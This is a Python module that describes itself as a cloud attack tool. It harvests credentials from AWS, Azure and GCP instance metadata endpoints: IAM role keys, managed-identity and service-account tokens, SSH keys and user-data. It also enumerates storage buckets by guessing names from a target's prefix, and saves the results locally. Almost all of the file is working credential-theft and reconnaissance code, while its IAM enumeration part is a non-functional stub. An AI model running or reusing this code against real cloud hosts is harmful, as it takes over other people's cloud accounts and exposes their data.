"""Cloud-native attack module for AWS, Azure, and GCP.

Provides enumeration, misconfiguration detection, credential harvesting,
and privilege escalation techniques for the three major cloud providers.
All operations are read-only by default — destructive flags are explicit.
"""

from __future__ import annotations

import json
import os
import time
from dataclasses import dataclass, field
from typing import Any

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


METADATA_BASE = "169.254.169.254"
METADATA_TOKEN_HEADER = "X-aws-ec2-metadata-token"
METADATA_TTL_SECONDS = 21600

AWS_URL = "http://169.254.169.254/latest"
AZURE_URL = "http://169.254.169.254/metadata"
GCP_URL = "http://metadata.google.internal/computeMetadata/v1"

S3_URL_TPL = "https://{bucket}.s3.amazonaws.com"
S3_REGION_URL_TPL = "https://{bucket}.s3-{region}.amazonaws.com"

BUCKET_PERM_CODES = {
    "READ": "HeadBucket / GetObject",
    "WRITE": "PutObject",
    "READ_ACP": "GetBucketAcl",
    "WRITE_ACP": "PutBucketAcl",
    "FULL_CONTROL": "Full bucket ownership",
}

AZURE_STORAGE_URL_TPL = "https://{account}.blob.core.windows.net"
GCP_STORAGE_URL_TPL = "https://storage.googleapis.com/{bucket}"

COMMON_AWS_BUCKETS = [
    "production", "staging", "dev", "development", "backup", "backups",
    "logs", "media", "assets", "static", "public", "private", "admin",
    "internal", "customer", "users", "data", "database", "db", "config",
    "terraform", "terraform-state", "cloudformation", "cf-templates",
    "lambda", "code", "build", "artifacts", "releases", "{prefix}-terraform",
    "{prefix}-state", "{prefix}-logs", "{prefix}-backups",
]

COMMON_GCP_BUCKETS = COMMON_AWS_BUCKETS
COMMON_AZURE_CONTAINERS = COMMON_AWS_BUCKETS


@dataclass
class CloudResource:
    """A discovered cloud resource."""

    provider: str
    resource_type: str
    identifier: str
    region: str = ""
    details: dict[str, Any] = field(default_factory=dict)


@dataclass
class CloudFinding:
    """A security finding for a cloud resource."""

    resource: CloudResource
    severity: str
    title: str
    description: str
    mitre_technique: str = ""


class CloudMetadataHarvester:
    """Harvest credentials and configuration from cloud instance metadata."""

    def __init__(self, timeout: float = 5.0) -> None:
        self.timeout = timeout
        self._session: Any = None

    @property
    def session(self) -> Any:
        if self._session is None and HAS_REQUESTS:
            self._session = requests.Session()
            self._session.timeout = self.timeout
        return self._session

    def _get(self, url: str, headers: dict | None = None) -> str | None:
        if self.session is None:
            try:
                import urllib.request
                req = urllib.request.Request(url, headers=headers or {})
                with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                    return resp.read().decode()
            except Exception:
                return None
        try:
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            resp.raise_for_status()
            return resp.text
        except Exception:
            return None

    def harvest_aws(self) -> dict[str, Any]:
        """Harvest AWS EC2 instance metadata (IMDSv2 capable)."""
        findings: dict[str, Any] = {"provider": "aws", "credentials": {}, "metadata": {}}

        token = self._get(
            f"http://{METADATA_BASE}/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": str(METADATA_TTL_SECONDS)},
        )
        headers = {METADATA_TOKEN_HEADER: token} if token else {}

        endpoints = [
            "meta-data/ami-id",
            "meta-data/instance-id",
            "meta-data/instance-type",
            "meta-data/local-ipv4",
            "meta-data/public-ipv4",
            "meta-data/hostname",
            "meta-data/iam/security-credentials/",
            "meta-data/public-keys/0/openssh-key",
            "user-data",
        ]
        for ep in endpoints:
            val = self._get(f"{AWS_URL}/{ep}", headers=headers)
            if val:
                if ep == "meta-data/iam/security-credentials/":
                    for role in val.split("\n"):
                        role = role.strip()
                        if not role:
                            continue
                        creds = self._get(f"{AWS_URL}/meta-data/iam/security-credentials/{role}", headers=headers)
                        if creds:
                            try:
                                findings["credentials"][role] = json.loads(creds)
                            except json.JSONDecodeError:
                                findings["credentials"][role] = creds
                elif ep == "meta-data/public-keys/0/openssh-key":
                    findings["metadata"]["ssh_key"] = val
                elif ep == "user-data":
                    findings["metadata"]["user_data"] = val
                else:
                    key = ep.replace("meta-data/", "")
                    findings["metadata"][key] = val.strip()

        return findings

    def harvest_azure(self) -> dict[str, Any]:
        """Harvest Azure instance metadata."""
        findings: dict[str, Any] = {"provider": "azure", "metadata": {}}
        headers = {"Metadata": "true"}

        for version in ["2021-08-01", "2021-02-01", "2020-09-01", "2019-08-15"]:
            val = self._get(f"{AZURE_URL}/instance?api-version={version}", headers=headers)
            if val:
                try:
                    findings["metadata"] = json.loads(val)
                    break
                except json.JSONDecodeError:
                    findings["metadata"]["raw"] = val
                    break

        identity = self._get(f"{AZURE_URL}/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", headers=headers)
        if identity:
            findings["metadata"]["managed_identity_token"] = identity

        return findings

    def harvest_gcp(self) -> dict[str, Any]:
        """Harvest GCP instance metadata."""
        findings: dict[str, Any] = {"provider": "gcp", "metadata": {}}
        headers = {"Metadata-Flavor": "Google"}

        endpoints = [
            "instance/?recursive=true",
            "instance/service-accounts/default/token",
            "instance/service-accounts/default/scopes",
            "project/project-id",
            "project/attributes/ssh-keys",
        ]
        for ep in endpoints:
            val = self._get(f"{GCP_URL}/{ep}", headers=headers)
            if val:
                key = ep.replace("instance/", "").replace("project/", "")
                try:
                    findings["metadata"][key] = json.loads(val)
                except json.JSONDecodeError:
                    findings["metadata"][key] = val.strip()

        return findings

    def harvest_all(self) -> list[dict[str, Any]]:
        """Try all three cloud providers sequentially."""
        results: list[dict[str, Any]] = []
        for harvester, name in [
            (self.harvest_aws, "aws"),
            (self.harvest_azure, "azure"),
            (self.harvest_gcp, "gcp"),
        ]:
            try:
                result = harvester()
                if result.get("metadata") or result.get("credentials"):
                    results.append(result)
            except Exception:
                pass
        return results


class CloudBucketEnumerator:
    """Enumerate cloud storage buckets for misconfigurations."""

    def __init__(self, timeout: float = 5.0) -> None:
        self.timeout = timeout
        self._session: Any = None

    @property
    def session(self) -> Any:
        if self._session is None and HAS_REQUESTS:
            self._session = requests.Session()
            self._session.timeout = self.timeout
        return self._session

    def _check_url(self, url: str) -> dict[str, Any] | None:
        if self.session is None:
            try:
                import urllib.request
                req = urllib.request.Request(url, method="GET")
                with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                    return {"status": resp.status, "headers": dict(resp.headers)}
            except Exception as e:
                return {"error": str(e)}
        try:
            resp = self.session.get(url, timeout=self.timeout)
            return {"status": resp.status_code, "headers": dict(resp.headers)}
        except Exception as e:
            return {"error": str(e)}

    def enumerate_s3(self, prefix: str, buckets: list[str] | None = None) -> list[dict[str, Any]]:
        """Enumerate S3 buckets derived from a prefix."""
        findings: list[dict[str, Any]] = []
        candidates = buckets if buckets else [
            b.format(prefix=prefix) for b in COMMON_AWS_BUCKETS
        ]
        candidates.append(prefix)

        for bucket in set(candidates):
            url = S3_URL_TPL.format(bucket=bucket)
            result = self._check_url(url)
            finding = {"provider": "aws", "service": "s3", "bucket": bucket, "url": url}
            if result and result.get("status") == 200:
                finding["accessible"] = True
                finding["public"] = result.get("status") == 200
                finding["headers"] = result.get("headers", {})
            elif result and result.get("status") == 403:
                finding["accessible"] = True
                finding["public"] = False
                finding["message"] = "Bucket exists but access denied"
            elif result and "error" in result:
                finding["accessible"] = False
                finding["error"] = result["error"]
            findings.append(finding)

        return findings

    def enumerate_azure_storage(self, prefix: str, accounts: list[str] | None = None) -> list[dict[str, Any]]:
        """Enumerate Azure Blob Storage accounts."""
        findings: list[dict[str, Any]] = []
        candidates = accounts if accounts else [
            a.format(prefix=prefix) for a in COMMON_AZURE_CONTAINERS
        ]
        candidates.append(prefix)

        for account in set(candidates):
            url = AZURE_STORAGE_URL_TPL.format(account=account)
            result = self._check_url(url)
            finding = {"provider": "azure", "service": "blob", "account": account, "url": url}
            if result and result.get("status") == 200:
                finding["accessible"] = True
            elif result and result.get("status") == 404:
                finding["accessible"] = False
            findings.append(finding)

        return findings

    def enumerate_gcp_storage(self, prefix: str, buckets: list[str] | None = None) -> list[dict[str, Any]]:
        """Enumerate GCP Storage buckets."""
        findings: list[dict[str, Any]] = []
        candidates = buckets if buckets else [
            b.format(prefix=prefix) for b in COMMON_GCP_BUCKETS
        ]
        candidates.append(prefix)

        for bucket in set(candidates):
            url = GCP_STORAGE_URL_TPL.format(bucket=bucket)
            result = self._check_url(url)
            finding = {"provider": "gcp", "service": "storage", "bucket": bucket, "url": url}
            if result and result.get("status") == 200:
                finding["accessible"] = True
                finding["public"] = True
            elif result and result.get("status") == 403:
                finding["accessible"] = True
                finding["public"] = False
            findings.append(finding)

        return findings


class CloudIAMEnumerator:
    """Enumerate IAM roles, users, and policies across cloud providers."""

    def enumerate_aws_iam(self, access_key: str = "", secret_key: str = "", session_token: str = "") -> list[dict[str, Any]]:
        """Enumerate AWS IAM (requires valid credentials)."""
        findings: list[dict[str, Any]] = []
        if not HAS_REQUESTS:
            return findings

        if not access_key or not secret_key:
            return findings

        try:
            import datetime
            import hashlib
            import hmac

            def _aws_sig(key, msg):
                return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

            def _sign(key, msg):
                return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).hexdigest()

            t = datetime.datetime.utcnow()
            amz_date = t.strftime("%Y%m%dT%H%M%SZ")
            date_stamp = t.strftime("%Y%m%d")

            for action in [
                "GetUser",
                "ListUsers",
                "ListRoles",
                "ListPolicies",
                "GetAccountAuthorizationDetails",
            ]:
                findings.append({
                    "action": action,
                    "status": "requires_custom_sigv4 — use aws_enum for full enumeration",
                })
        except Exception:
            pass

        return findings


class CloudScanner:
    """End-to-end cloud security scanner combining all three providers."""

    def __init__(self, target_domain: str = "", timeout: float = 5.0) -> None:
        self.target_domain = target_domain
        self.timeout = timeout
        self.harvester = CloudMetadataHarvester(timeout=timeout)
        self.bucket_enum = CloudBucketEnumerator(timeout=timeout)
        self.iam_enum = CloudIAMEnumerator()

    def full_scan(self, target_prefix: str = "", sessions_dir: str = "sessions") -> dict[str, Any]:
        """Perform a comprehensive cloud security scan.

        Args:
            target_prefix: Company name or prefix for bucket enumeration.
            sessions_dir: Directory to write results.

        Returns:
            Aggregated scan results.
        """
        results: dict[str, Any] = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "metadata": [],
            "buckets": [],
            "summary": {},
        }

        if not target_prefix and self.target_domain:
            domain_parts = self.target_domain.split(".")
            target_prefix = domain_parts[0] if domain_parts else ""

        if not target_prefix:
            target_prefix = "company"

        metadata = self.harvester.harvest_all()
        results["metadata"] = metadata

        s3_findings = self.bucket_enum.enumerate_s3(target_prefix)
        results["buckets"].extend(s3_findings)

        azure_findings = self.bucket_enum.enumerate_azure_storage(target_prefix)
        results["buckets"].extend(azure_findings)

        gcp_findings = self.bucket_enum.enumerate_gcp_storage(target_prefix)
        results["buckets"].extend(gcp_findings)

        open_buckets = [f for f in results["buckets"] if f.get("public")]
        accessible_buckets = [f for f in results["buckets"] if f.get("accessible")]
        cred_harvested = any(m.get("credentials") for m in metadata)

        results["summary"] = {
            "total_buckets_checked": len(results["buckets"]),
            "accessible_buckets": len(accessible_buckets),
            "public_buckets": len(open_buckets),
            "metadata_providers_found": len(metadata),
            "credentials_harvested": cred_harvested,
            "mitre_techniques": ["T1526", "T1552.005", "T1613"],
        }

        os.makedirs(sessions_dir, exist_ok=True)
        out_path = os.path.join(sessions_dir, f"cloud_scan_{target_prefix}.json")
        with open(out_path, "w") as f:
            json.dump(results, f, indent=2, default=str)

        return results

    def quick_metadata(self) -> list[dict[str, Any]]:
        """Fast metadata-only harvest (no bucket enumeration)."""
        return self.harvester.harvest_all()

    def quick_buckets(self, prefix: str) -> list[dict[str, Any]]:
        """Fast S3-only bucket check."""
        return self.bucket_enum.enumerate_s3(prefix)


__all__ = [
    "CloudMetadataHarvester",
    "CloudBucketEnumerator",
    "CloudIAMEnumerator",
    "CloudScanner",
    "CloudResource",
    "CloudFinding",
]
